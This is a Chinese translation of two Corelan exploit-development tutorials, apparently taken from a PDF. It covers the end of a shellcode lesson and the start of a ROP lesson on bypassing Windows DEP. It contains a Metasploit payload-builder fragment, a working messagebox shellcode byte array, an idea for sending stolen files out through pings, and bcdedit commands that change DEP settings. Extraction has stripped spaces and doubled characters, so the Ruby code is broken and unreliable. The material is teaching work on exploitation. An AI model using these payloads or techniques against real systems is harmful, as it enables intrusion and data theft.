iSniperText=iText-1
ifiCheckChars!=iTextthen
iTargetChars=(iNrLines+1)*4
whileiText=0
thisChar=strText[icnt,1]
strLine=thisChar+strLine
ificharcnt<3
icharcnt+=1
else
strPushText=strPushText+"h"+strLine #h=\68=push
strLine=""
icharcnt=0
end
icnt=icnt-1
end
#generateopcodetowritenullbyte
strWriteTextNull="\x31\xc9\x88\x4C\x24"
strWriteTextNull+=iSniperText.chr+"\x89\xe1"
#buildpayload
payload_data=module_info['Payload']['Payload']
payload_data+=strPushTitle+strWriteTitleNull
payload_data+=strPushText+strWriteTextNull
trailer_data="\x31\xd2\x52"
trailer_data+="\x53\x51\x52\xff\xd0\x31\xc0\x50"
trailer_data+="\xff\x55\x08"
payload_data+=trailer_data
returnpayload_data
else
raiseArgumentError,"Titleshouldbe255charactersorless"
end
end
end
end
试一下：
./msfpayloadwindows/messagebox
TEXT="YouhavebeenownedbyCorelan"
TITLE="Oops-whathappened?"C
/*
*windows/messagebox-303bytes
*http://www.metasploit.com
*TEXT=YouhavebeenownedbyCorelan,TITLE=Oops-what
*happened?
*/
unsignedcharbuf[]=
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x7a\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x37\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff\xff"
"\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a\x24\x01\xeb\x66\x8b\x0c"
"\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
"\x52\xe8\x9c\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87"
"\x1c\x24\x52\xe8\x8b\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20"
"\xff\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a"
"\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87"
"\x1c\x24\x52\xe8\x5e\xff\xff\xff\x68\x20\x3f\x58\x20\x68\x65"
"\x6e\x65\x64\x68\x68\x61\x70\x70\x68\x68\x61\x74\x20\x68\x20"
"\x2d\x20\x77\x68\x4f\x6f\x70\x73\x31\xdb\x88\x5c\x24\x16\x89"
"\xe3\x68\x61\x6e\x58\x20\x68\x6f\x72\x65\x6c\x68\x62\x79\x20"
"\x43\x68\x6e\x65\x64\x20\x68\x6e\x20\x6f\x77\x68\x20\x62\x65"
"\x65\x68\x68\x61\x76\x65\x68\x59\x6f\x75\x20\x31\xc9\x88\x4c"
"\x24\x1e\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50"
"\xff\x55\x08";
（甚至在WindowsVista和Windows7下工作地很漂亮）
（多谢Jacky的截屏）
当你能用现成的高质量代码时就用--------但是当你不得不时要时刻准备
有创造力
我很想将你的注意力吸引到一些好的并且有创造力的shellcode例子，最近由DidierStevens
发布的。
例子1：从vba代码中加载dll，没有接触硬盘或者显示一个新的进程:-)
http://blog.didierstevens.com/2010/01/28/quickpost-shellcode-to-load-a-dll-from-memory/
例子2：pingshellcode
http://blog.didierstevens.com/2010/02/22/ping-shellcode/
很明白第一个例子的附加值是什么。那第二个呢？pingshellcode？
好的，思考下我们能对它做些什么。
如果一个你正在攻击的远程主机没有通过任何端口连接网络...但是如果它能ping通，你依然
可以利用这个来转移任意文件回来...只要写些读取文件的shellcode，并且用文件的目录（一
行接一行）作为payload，通过一系列的ping。Ping回来（你自己或者ping一个你能嗅探icmp
数据包的特殊主机），你就可以读文件的目录。（例子：写一个会做pwddump的shellcode，
然后通过ping将输出传送回来）。
EEEExxxxppppllllooooiiiitttt 编写系列教程第十篇：用 RRRROOOOPPPP 束缚 DDDDEEEEPPPP----酷比魔方
译：看雪论坛-dragonltx-2010-9-20
介绍
在我完成我前面的exploit相关教程之后三个月，我最终找了些时间和精力来开始写一篇新
的文章。
在前面的教程中，我已经解释了基于栈溢出的基础和怎样执行任意的代码。我讨论了 direct
ret溢出，基于SEH的exploit，Unicode和其他的字符限制条件，运用调试器插件来加速exploit
的开发，怎样绕过常用的内存保护机制和怎样写你自己的shellcode。
然而第一个教程是写来引导人们学习 exploit开发的基础，从乱写开始（主要是为了照顾那
些不懂exploit开发的人们），你很可能发现最近的教程大体上继续在这些基础上下功夫，并
且需要牢固的asm知识，创造力的思想，和一些exploit写作的经验。
今天的教材是不一样的。我将继续在我们已经在前面的教程中见过和学到的知识上更上一
步。这需要一些一些要求：
1、你需要掌握基于栈溢出的利用技术（directRET，SEH，等等）。我假设你已经具备了。
2、你需要一些asm知识。不要担心。即使你的知识只是能够明白特定指令的作用，你也将
可能读懂这篇教程。但是当你想自己打造自己的ropexploit/应用rop技术，当你需要完成一
个特定的任务时，你需要能够写 asm/认出asm指令。总之，在某种程度上，你能够在写rop
链和写通用的shellcode之间进行比较，因此我猜你已经有了一定水准的asm编写水平。
3、你需要知道怎样用ImmunityDebugger。设置断点，单步执行，修改寄存器和栈上的值。
4、你需要知道栈是如何工作的，数据是怎样入栈的，出栈的，寄存器是怎样工作的并且怎
样使寄存器和栈之间互相影响。这是开始写ROP所必须的。
5、如果你没有掌握基于栈溢出利用的基础，那么这文章不适合你。我将试着解释并且尽可
能好的写出所有的步骤，但是为了避免以一篇很长的文章结束，我将会假设你知道基于栈溢
出的原理和利用方法。
在 这 系 列 的 文 章 6 中
http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-
cookies-safeseh-hw-dep-and-aslr/，我已经解释了一些技术来绕过内存保护系统。今天，我将
精心阐述这些保护机制中的一个，叫做DEP。（更确切地说，我将讨论硬件DEP（NX/XD）
和怎样绕过它）。在教程6中你可以读到，有2中主要的保护机制...首先，开发者能够利用
很多技术（安全编码，栈cookies，safeseh，等等）。大多数的编译器和链接器现在默认使用
这些特征（除了“安全编码”，这不是课程的一个特征），这是很不错的。很悲哀，还有相当
多数量的应用程序没有利用保护措施，依靠其他的保护机制。我想你会同意还有很多的开发
者没有将安全编码应用到他们的所有代码中。更重要的是（是事情更糟），一些开发者开始
依靠OS的保护机制（看下面），并且不关心安全编码。
这将我们带到保护的第二层，所有最近版本的Windows操作系统的一部分：ASLR（地址空
间布局随机化）和DEP（数据执行保护）。
ASLR将使栈，堆，模块基地址随机化，使它很难被“预测”（甚至硬编码）地址/内存位置，
因此，使黑客很难打造可靠的exploit。DEP（在这个教程里我指硬件DEP）将会基本上阻
止代码在栈上执行（这是所有前面教程所做的）。
ASLR和DEP的结合已经证明了在大多数情况下是有效的（但是，今天你将会学到的，在
特定环境下还是可以被绕过的）。
简言之，应用程序bug/缓冲区溢出不会自动魔幻地消失，将会不可能消失，并且编译器/链
接器不是一直对所有的模块都适用。这意味着 ASLR 和DEP是我们最后的防御层。ASLR
和DEP是所有最近OS的一部分，因此，很自然地可以看到攻击/绕过这两种保护机制已经
成为黑客和研究者的重要目标。
在教程里用来绕过DEP的技术不是最新的技术。它基于ret-to-libc的思想并且被烙上“ROP”
的印记，是“ReturnOrientedProgramming”的简称。
我 已 经 在 教 程 6 中 讨 论 了 ret-to-libc 的 思 想 ， 实 际 上 ， 在 教 程 6 中 解 释 的
NtSetInformationProcess技术是ROP的一个例子。
在过去的几年/几月，用ROP绕过DEP的新技术已经写出来了。这个教程做的就是简单地
将所有的信息聚集起来并且解释他们是怎样用来在win32系统上绕过EDP的。
在看DEP是什么，怎样绕过它之前，有一件很重要的事要记住：：
在所有的前面教程中，我们的shellcode（包括定位代码等等）是放在栈或者堆上，并且试着
用可靠的方法来跳到代码处并执行。
由于硬件DEP的使用，我们不能再栈上执行一条指令。你可以在栈上弹入并且弹出数据，
但是我们不能跳到栈中执行代码。在没有绕过/禁掉DEP时不行。
记住。
WWWWiiiinnnn33332222 世界中的硬件 DDDDEEEEPPPP
硬件DEP利用了在DEP兼容的CPU的NX（“无执行页保护”，AMD规格）或者XD（“不
能执行”，intel规格）位，并且将特定部分的内存（只能包含数据，比如说默认堆，栈，内
存池）标记为不可执行。
当 尝 试 在 一 个 DEP 保 护 的 数 据 页 执 行 代 码 时 ， 将 会 发 生 访 问 拒 绝
（STATUS_ACCESS_VIOLATION（0xc0000005））。在大部分情况下，这会导致进程结束（没
有处理的异常）。事实上，当一个开发者决定他想允许代码在一个特定的内存页中运行，他
将不得不分配内存然后标记为可执行。
在WindowsXPSP2和WindowsServer2003SP1引入了硬件DEP的支持，并且是这两种版
本之后的所有Windows操作系统的一部分。
DEP作用在每个虚拟内存页面并且会改变PTE（页表入口点）上的一位来标记页面。
为了使OS用这个特征，处理器必须运行在PAE模式（物理地址扩展）。幸运地，Windows
默认开启PAE。（64位的系统是知道“AddressWindowingExtensions”（AWE），因此也不需
要在64位上有一个分离的PAE内核）。
DEP在Windows操作系统中表现的方式是基于一个能够配置成下列值中的一个的环境：
●OptIn：只有有限的一些windows系统模块/二进制程序是受DEP保护的。
●OptOut：所有在Windows系统上的程序，进程，服务都是受保护的，除了在例外列表中的
进程。
●AlwaysOn：所有在Windows系统上的程序，进程，服务都是受保护的。没有例外。
●AlwaysOff：DEP被关掉。
除了这四个模式之外，MS实现了一种叫做“永久的 DEP”机制，用 SetProcessDEPPolicy
（PROCESS_DEP_ENABLE）来确保进程是启用DEP的。在Vista（并且之后的）上，这个“永
久”的标记是自动对所有的可执行文件（用/NXCOMPAT选项）设置的。当标记被设置，那么
改变DEP策略可能只能用SetProcessDEPPolicy技术（看后面）。
你 可 以 在 http://msdn.microsoft.com/en-us/library/bb736299(VS.85).aspx 和
http://blogs.msdn.com/b/michael_howard/archive/2008/01/29/new-nx-apis-added-to-
windows-vista-sp1-windows-xp-sp3-and-windows-server-2008.aspx 找 到 更 多 有 关
SetProcessDEPPolicy的信息。
对不同版本的Windows操作系统的默认设置是：
●Windows XP SP2，XP SP3,Vista SP0：OptIn（XP SP3也有永久的DEP）
●Windows Vista SP1：OptIn+AlwaysOn（+永久的DEP）
●Windows 7：OptOut+AlwaysOn（永久的DEP）
●Windows Server 2003 SP1和更高的：OptOut
●Windows Server 2008和更高的：OptOut+AlwaysOn（+永久的DEP）
在XP和2003 server上，DEP行为可以通过boot.ini的参数来改变。只要简单地在这行的
末尾加上下面的参数（引用你的OS启动配置）：
/noexecute=policy
（这里“policy”可以是OptIn，OptOut，AlwaysOn或者AlwaysOff）
在Vista/Windows2008/Windows7，你能用bcdedit命令来改变设置：
bcdedit.exe/setnxOptIn
bcdedit.exe/setnxOptOut